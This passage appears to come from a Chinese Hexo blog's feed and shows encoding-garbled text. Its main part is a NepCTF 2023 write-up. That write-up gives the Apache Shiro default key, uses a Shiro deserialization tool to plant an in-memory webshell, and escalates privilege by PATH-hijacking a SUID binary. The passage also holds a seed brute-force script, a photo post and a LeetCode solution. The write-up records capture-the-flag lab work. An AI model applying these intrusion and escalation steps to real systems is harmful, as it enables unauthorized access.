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</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"># è§£ç base64æ•°æ®</span><br><span class="line">decoded_data = base64.b64decode(base64_encoded_data)</span><br><span class="line"></span><br><span class="line"># å°†è§£ç åçš„æ•°æ®å†™å…¥PNGæ–‡ä»¶</span><br><span class="line">with open(&quot;restored_qrcode.png&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    f.write(decoded_data)</span><br><span class="line"></span><br><span class="line"># æ‰“å¼€æ¢å¤åçš„QRç å›¾åƒ</span><br><span class="line">restored_qrcode = Image.open(&quot;restored_qrcode.png&quot;)</span><br><span class="line">restored_qrcode.show()</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„äºŒç»´ç ç›´æ¥æ‰«æå°±å¾—åˆ°æ•°æ®ï¼Œæ¥ä¸‹æ¥å°±æ˜¯è€ƒè™‘ç¼–å†™è„šæœ¬çˆ†ç ´ã€‚</p><p>æ€è·¯å°±æ˜¯ï¼šæŠŠå·²çŸ¥çš„20ä¸ªæ•°å€¼ä¼ ä¸Šå»ï¼Œç„¶åç”¨å¾ªç¯å¼€å§‹æ‰§è¡Œéšæœºç”Ÿæˆseedå’Œgetrandbits(8)ï¼Œå½“æ‰¾åˆ°åŒ¹é…çš„ç»“æœä¹‹åå°±ç»§ç»­ä¸‹ä¸€ä½ï¼Œç›´åˆ°20ä¸ªæ•°å€¼å…¨éƒ¨åŒ¹é…æˆåŠŸï¼Œå°±è¯´æ˜æ‰¾åˆ°äº†é‚£ä¸ªåºåˆ—ï¼Œå°±ç›´æ¥å†æ‰§è¡Œä¸€æ¬¡è¾“å‡ºç¬¬21ä½çš„å€¼ã€‚</p><p>è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># auther:youzhi</span><br><span class="line"># time:2023/8/28</span><br><span class="line">from random import seed, getrandbits</span><br><span class="line"></span><br><span class="line"># å·²çŸ¥çš„ 20 ä¸ªæ•°å€¼</span><br><span class="line">known_values = [78,122,161,126,38,94,156,23,65,190,167,204,205,160,124,45,170,60,107,148]</span><br><span class="line"></span><br><span class="line"># å¾…çˆ†ç ´çš„ç›®æ ‡å€¼</span><br><span class="line">target = None</span><br><span class="line"></span><br><span class="line"># å°è¯•ä¸åŒçš„ç§å­å’Œéšæœºæ•°ç”Ÿæˆï¼Œç›´åˆ°æ‰¾åˆ°åŒ¹é…çš„ç»“æœ</span><br><span class="line">for secret_seed in range(1, 1000):</span><br><span class="line">    seed(secret_seed)  # è®¾ç½®ç§å­</span><br><span class="line">    for _ in range(20):</span><br><span class="line">        generated_value = getrandbits(8)</span><br><span class="line">        if generated_value != known_values[_]:</span><br><span class="line">            break</span><br><span class="line">    else:</span><br><span class="line">        # æ‰¾åˆ°åˆé€‚çš„ç§å­å’Œéšæœºæ•°ç”Ÿæˆæ–¹å¼</span><br><span class="line">        target = getrandbits(8)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"># è¾“å‡ºç»“æœ</span><br><span class="line">if target is not None:</span><br><span class="line">    print(&quot;Found target:&quot;, target)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;Target not found&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF-2023-webéƒ¨åˆ†writeup</title>
      <link href="/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/08/29/nepctf-2023-web%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h1><h2 id="é¢˜ç›®æ¥æº"><a href="#é¢˜ç›®æ¥æº" class="headerlink" title="é¢˜ç›®æ¥æº"></a>é¢˜ç›®æ¥æº</h2><p>NepCTF2023-<strong>ez_java_checkin</strong></p><h2 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>shiro550ååºåˆ—åŒ–</p><h2 id="é¢˜ç›®å†…å®¹"><a href="#é¢˜ç›®å†…å®¹" class="headerlink" title="é¢˜ç›®å†…å®¹"></a>é¢˜ç›®å†…å®¹</h2><p>è¿›å…¥ä¹‹å</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/111-1024x334.png"></p><p>å¼±å£ä»¤admin adminç™»å½•ç®¡ç†å‘˜ï¼Œå‘ç°remembermeå­—æ®µï¼Œåˆ¤æ–­ä¸ºshiroååºåˆ—åŒ–</p><p>ç®¡ç†å‘˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remembermeï¼šMOTxEj+Cpb97nTWsgAl7OWPq7efd60ZYeSX9PUxlSDrcbbbrOFVXJUwlS2BvQ5iIiHhj2D162GgzUCkhL5AQ5Io++M0gBdfBqT9yHXSSgGn/LLvyZAoq/9wTNeB5txSBuEKe6nxY0NW0cpnkwguPd0jgQIHiM5PxTT/bAJFarV0QPkKVc8oJz94IUTZRUfV+7zii7LduVumSTKlO6lSTbkGys1m91kutnYW8q48+LPcQkEKBvShgBM8r+fNId87yy3mAHXGd0hQ0vEsyqnlziIGphrvw5qkbgfDCQ2oZPO/zQgosiQhZ24Sq55kDX7lmtEKp2Og+HTfR+snXiU3FE0NC/l8k/3gFNrXO1jpdgFgl56k2C/wd+lqfddXPUrT8i6SrkmIR4NZrNKRLL0xHm/shahhVSIw/tLGEiPtUSnt7X0OADQPrjIupxO37VzRAkBkedyDHP7iE8p7sxa8Si6r/OTZkUHgIOadq5MNNZlIsBQK8gZH3ecw7mYIsj+CaWrsA3NUa9neFraH6eGMW0w==</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å·¥å…·ï¼š</p><p><a href="https://github.com/SummerSec/ShiroAttack2">https://github.com/SummerSec/ShiroAttack2</a></p><hr><p>å‘ƒå‘ƒç¯å¢ƒæ²¡äº†ï¼Œæœ¬åœ°éƒ¨ç½²ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar  ShiroSpring-0.0.1-SNAPSHOT.jar  --server.port=81</span><br></pre></td></tr></table></figure><p>è®¿é—®127.0.0.1:81</p><hr><p>å…³äºå¯†é’¥ï¼Œè¿™ä¸ªå·¥å…· å¯†é’¥çˆ†ç ´ä¸å‡ºæ¥ï¼Œå®é™…ä¸Šå°±æ˜¯é»˜è®¤å¯†é’¥</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/112-1024x473.png"></p><p>å¯†é’¥ï¼škPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;</p><p>åˆ©ç”¨é“¾ç”¨å·¥å…·çˆ†ç ´</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/113-1024x99.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/114.png"></p><p>ç›´æ¥ç”¨å·¥å…·æ³¨å†…å­˜é©¬äº†</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/115-1024x317.png"></p><p>èšå‰‘è¿æ¥çš„æ—¶å€™æ³¨æ„ä¸€ä¸‹å› ä¸ºæ˜¯javaçš„æ‰€ä»¥æ˜¯jspè¿æ¥ä¸æ˜¯PHPã€‚</p><hr><p>èšå‰‘è¿ä¸Šä¹‹åå‘ç°æ²¡æœ‰æƒé™è¯»å–flagï¼Œéœ€è¦ææƒ</p><p>ä½¿ç”¨ SUID ææƒ</p><p>å‚è€ƒï¼š</p><p><a href="https://www.anquanke.com/post/id/86979">https://www.anquanke.com/post/id/86979</a></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/116.png"></p><hr><p>æœ‰ä¸€ä¸ªéé¢„æœŸï¼šstart.shé‡Œé¢æœ‰flagï¼Œä¸éœ€è¦ææƒã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117.png"></p><h1 id="ç‹¬æ­¥å¤©ä¸‹"><a href="#ç‹¬æ­¥å¤©ä¸‹" class="headerlink" title="ç‹¬æ­¥å¤©ä¸‹"></a>ç‹¬æ­¥å¤©ä¸‹</h1><h2 id="é¢˜ç›®æ¥æº-1"><a href="#é¢˜ç›®æ¥æº-1" class="headerlink" title="é¢˜ç›®æ¥æº"></a>é¢˜ç›®æ¥æº</h2><p>NepCTF2023-<strong>ç‹¬æ­¥å¤©ä¸‹-è½¬ç”Ÿæˆä¸ºé•œèŠ±æ°´æœˆä¸­çš„ç‹è€…+ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è™šå¦„_æ¢è§çœŸå®+ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è¯•ç‚¼_åŠ å†•æˆç‹</strong></p><h2 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h2><p>SUIDææƒ+å†…ç½‘æ¸—é€+åå¼¹shell</p><h2 id="ç‹¬æ­¥å¤©ä¸‹-è½¬ç”Ÿæˆä¸ºé•œèŠ±æ°´æœˆä¸­çš„ç‹è€…"><a href="#ç‹¬æ­¥å¤©ä¸‹-è½¬ç”Ÿæˆä¸ºé•œèŠ±æ°´æœˆä¸­çš„ç‹è€…" class="headerlink" title="ç‹¬æ­¥å¤©ä¸‹-è½¬ç”Ÿæˆä¸ºé•œèŠ±æ°´æœˆä¸­çš„ç‹è€…"></a><strong>ç‹¬æ­¥å¤©ä¸‹-è½¬ç”Ÿæˆä¸ºé•œèŠ±æ°´æœˆä¸­çš„ç‹è€…</strong></h2><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>hintï¼šç¯å¢ƒå˜é‡ææƒ</p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><p>nc è¿æ¥</p><p>é¦–å…ˆå°è¯•SUIDææƒï¼ŒæŸ¥æ‰¾æœ‰suidçš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user root -perm /4000 2&gt;/tmp/err</span><br><span class="line">/bin/nmap</span><br></pre></td></tr></table></figure><p>flag æ²¡æƒé™è¯»</p><p>æœ‰å‡ºç½‘ï¼Œæ— dnsï¼Œæœ¬åœ°æœ‰nmap</p><p>nmapæœ‰suid</p><p>åˆ©ç”¨nmapææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: not found</span><br></pre></td></tr></table></figure><p>nmapåº”è¯¥ä¸æ˜¯æ­£å¸¸nmapï¼Œä¼šç›´æ¥æ‰§è¡Œ ports-alive</p><p>è¿›å…¥&#x2F;tmpç›®å½•ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ echo $PATH</span><br><span class="line">echo $PATH</span><br><span class="line">/sbin:/usr/sbin:/bin:/usr/bin</span><br><span class="line"></span><br><span class="line">export PATH=/tmp:$PATH</span><br></pre></td></tr></table></figure><p>å†™å…¥ports-alive</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">cat &lt;&lt; EOF &gt; ports-alive</span><br><span class="line">&gt; #!/bin/sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">&gt; cat /flag</span><br><span class="line">cat /flag</span><br><span class="line">&gt; EOF</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿˜è¦æ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -h</span><br><span class="line">sh: ports-alive: Permission denied</span><br><span class="line">/tmp $ chmod 777 ports-alive</span><br><span class="line">chmod 777 ports-alive</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨ &#x2F;tmp ç›®å½•æ‰§è¡Œ nmap -h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ nmap -h</span><br><span class="line">nmap -h</span><br><span class="line">å‡ä½œçœŸæ—¶çœŸäº¦å‡,çœŸä½œå‡æ—¶å‡äº¦çœŸ</span><br><span class="line">flag&#123;Everything_is_illusory&#125;</span><br></pre></td></tr></table></figure><h2 id="ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è™šå¦„-æ¢è§çœŸå®"><a href="#ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è™šå¦„-æ¢è§çœŸå®" class="headerlink" title="ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è™šå¦„_æ¢è§çœŸå®"></a><strong>ç‹¬æ­¥å¤©ä¸‹-ç ´é™¤è™šå¦„_æ¢è§çœŸå®</strong></h2><p>æ¥ä¸Šä¸€é¢˜çš„ç¯å¢ƒ</p><p>Hint <code>ports-alive ä¿®æ­£åæ‰«æç½‘æ®µ ï¼ˆipèŒƒå›´0åˆ°100ï¼‰ç”¨åŸºç¡€getåŒ…æ¢æµ‹è·å–html echo -e &quot;GET / HTTP/1.1\\r\\nHost: 192.168.200.1\\r\\n\\r\\n&quot; nc xx xx</code></p><p>å¯ä»¥å‡ºç½‘ï¼Œåˆšå¼€å§‹æƒ³ä¸Šä¼ ä¸€ä¸ªfscanæ‰«æï¼Œç»“æœæ‰«å‡ºä¸€ä¸ª80ç«¯å£ç„¶åå†…å­˜ä¸å¤Ÿfscanè¢«æ€äº†ï¼Œå°±åªèƒ½æ ¹æ®æç¤ºï¼Œä¿®æ­£nmapæ‰«æã€‚</p><p>å…ˆæŸ¥çœ‹ipï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/tmp $ ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000</span><br><span class="line">    link/ether 52:54:00:12:34:56 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.200.2/24 brd 192.168.200.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::5054:ff:fe12:3456/64 scope link</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: sit0@NONE: &lt;NOARP&gt; mtu 1480 qdisc noop qlen 1000</span><br><span class="line">    link/sit 0.0.0.0 brd 0.0.0.0</span><br></pre></td></tr></table></figure><p>æ‰«æ 192.168.200.2&#x2F;24 ç½‘æ®µ</p><p>å‘ç°ä¸€ä¸ªç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.200.1:82</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>82 éƒ¨ç½²äº†ä¸€ä¸ªä¸Šä¼ æœåŠ¡ï¼Œfrpå‡ºæ¥çœ‹çœ‹</p><hr><p>åç»­æœ‰ç©ºå†æ›´æ–°ã€‚ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­å·</title>
      <link href="/2023/08/23/%E6%9D%AD%E5%B7%9E/"/>
      <url>/2023/08/23/%E6%9D%AD%E5%B7%9E/</url>
      
        <content type="html"><![CDATA[<img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/8E995D92D9E7DBF8AC4FD92A83A0885E.jpg" alt="8E995D92D9E7DBF8AC4FD92A83A0885E" style="zoom:33%;" /><hr><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/2C837E6D0AC5EEEF43EC600073D8A711.jpg" alt="2C837E6D0AC5EEEF43EC600073D8A711" style="zoom:33%;" /><hr>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> æ‘„å½± </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‘„å½± </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCodeç¬¬ä¸€é¢˜-Cè¯­è¨€å®ç°</title>
      <link href="/2023/08/18/leetcode%E7%AC%AC%E4%B8%80%E9%A2%98-c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2023/08/18/leetcode%E7%AC%AC%E4%B8%80%E9%A2%98-c%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>å†™äº†ä¸¤ä¸ªç‰ˆæœ¬ï¼Œä¸€ä¸ªæ•°ç»„ä¸€ä¸ªå“ˆå¸Œè¡¨ã€‚å“ˆå¸Œè¡¨ç¡®å®æ•ˆç‡é«˜ï¼Œæ—¶é—´ç©ºé—´éƒ½æ˜¯ï¼Œä¸è¿‡ç©ºé—´ä¸Šè¿˜æ˜¯åšçš„ä¸å¤Ÿå¥½ï¼Œåº”è¯¥æ˜¯æˆ‘è®¾è®¡çš„é—®é¢˜ï¼Œæ•°ç»„è¡¨å¯èƒ½æ²¡æœ‰é“¾è¡¨å¥½å§ã€‚</p><p>ç»“æœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230818224555023-1024x214.png"></p><h3 id="1-ä¸¤æ•°ä¹‹å’Œ"><a href="#1-ä¸¤æ•°ä¹‹å’Œ" class="headerlink" title="1_ä¸¤æ•°ä¹‹å’Œ"></a>1_ä¸¤æ•°ä¹‹å’Œ</h3><h4 id="è¦æ±‚"><a href="#è¦æ±‚" class="headerlink" title="è¦æ±‚"></a>è¦æ±‚</h4><p>ç»™ä¸€ä¸ªæ•°ç»„å’Œä¸€ä¸ªtargetï¼Œè¦æ±‚è¿”å›æ•°ç»„çš„ä¸¤ä¸ªä¸‹æ ‡ï¼Œä½¿å¾—ä¸¤ä¸‹æ ‡å¯¹åº”çš„æ•°ä¹‹å’Œä¸ºtarget</p><h4 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h4><h5 id="ç®€å•ç®—æ³•ï¼š"><a href="#ç®€å•ç®—æ³•ï¼š" class="headerlink" title="ç®€å•ç®—æ³•ï¼š"></a>ç®€å•ç®—æ³•ï¼š</h5><ul><li>ç›´æ¥ä¸¤ä¸ªæŒ‡é’ˆï¼Œè¿›è¡Œç§»åŠ¨æŸ¥æ‰¾ã€‚<ul><li>æ—¶é—´å¤æ‚åº¦æ˜¯ n(n-1)&#x3D;&gt;n^2</li></ul></li><li>å…ˆé¡ºåºæ’åºï¼Œç„¶åè®¾ç½®ä¸¤ä¸ªæŒ‡é’ˆä¾æ¬¡æ¯”å¤§å°ï¼Œä»æœ€å°çš„ä¸¤ä¸ªæ•°ä¹‹å’Œå¼€å§‹ï¼Œç„¶åä¾æ¬¡å³ç§»<ul><li>å¦‚æœåˆšå¼€å§‹å°äº†å³ç§»ä¹‹åå¤§äº†ï¼Œè¯´æ˜æ²¡æœ‰è¿™æ ·çš„è§£ã€‚ä¸ä¸ä¸ï¼Œé¡ºåºæŸ¥æ‰¾å¯ä»¥äºŒåˆ†æ³•ã€‚</li><li>å¦‚æœåˆ°æœ€åéƒ½ä¸€ç›´å°ï¼Œè¯´æ˜æ²¡æœ‰è¿™æ ·çš„è§£</li><li>æ—¶é—´å¤æ‚åº¦æ˜¯ï¼šåˆšå¼€å§‹çš„é¡ºåºæ’åºâ€“ä¸€èˆ¬éƒ½æ˜¯n^2 + æŸ¥æ‰¾â€“ä¸€èˆ¬ n^2</li></ul></li></ul><h4 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">Â  * Note: The returned array must be malloced, assume caller calls free().  </span></span><br><span class="line"><span class="comment">Â  **/</span>  </span><br><span class="line">Â <span class="type">int</span>\* twoSum(<span class="type">int</span>\* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>\* returnSize)&#123;  </span><br><span class="line">Â  Â \*returnSize = <span class="number">2</span>;  </span><br><span class="line">Â  Â <span class="type">int</span>\* result = (<span class="type">int</span>\*)<span class="built_in">malloc</span>(<span class="number">2</span>\*<span class="keyword">sizeof</span>(<span class="type">int</span>));  </span><br><span class="line">Â  Â <span class="type">int</span> m,n;  </span><br><span class="line">Â  Â <span class="keyword">for</span>(m=<span class="number">0</span>;m&lt;numsSize<span class="number">-1</span>;m++)&#123;  </span><br><span class="line">Â  Â  Â <span class="keyword">for</span>(n=m+<span class="number">1</span>;n&lt;=numsSize<span class="number">-1</span>;n++)&#123;  </span><br><span class="line">Â  Â  Â  Â <span class="keyword">if</span>(nums\[m\]+nums\[n\]==target)&#123;  </span><br><span class="line">Â  Â  Â  Â  Â result\[<span class="number">0</span>\]=m;  </span><br><span class="line">Â  Â  Â  Â  Â result\[<span class="number">1</span>\]=n;  </span><br><span class="line">Â  Â  Â  Â  Â <span class="keyword">return</span> result;  </span><br><span class="line">Â  Â  Â  &#125;  </span><br><span class="line">Â  Â  &#125;  </span><br><span class="line">Â  &#125;  </span><br><span class="line">Â  Â <span class="built_in">free</span>(result);  </span><br><span class="line">Â  Â <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">Â &#125;  </span><br><span class="line">Â <span class="comment">/**int main()&#123;  </span></span><br><span class="line"><span class="comment">Â  Â  Â int nums\[\] = &#123;2, 7, 11,15&#125;;  </span></span><br><span class="line"><span class="comment">Â  Â  Â int target = 9;  </span></span><br><span class="line"><span class="comment">Â  Â  Â int numsSize = sizeof(nums) / sizeof(nums\[0\]);  </span></span><br><span class="line"><span class="comment">Â  Â  Â int returnSize = 2;  </span></span><br><span class="line"><span class="comment">Â  Â  Â int * result = twoSum(nums, numsSize, target, &amp;returnSize);  </span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">Â  Â  Â printf(&quot;%d,%d&quot;,result\[0\],result\[1\]);  </span></span><br><span class="line"><span class="comment">Â  Â  Â free(result);  </span></span><br><span class="line"><span class="comment">Â  Â  Â return 0;  </span></span><br><span class="line"><span 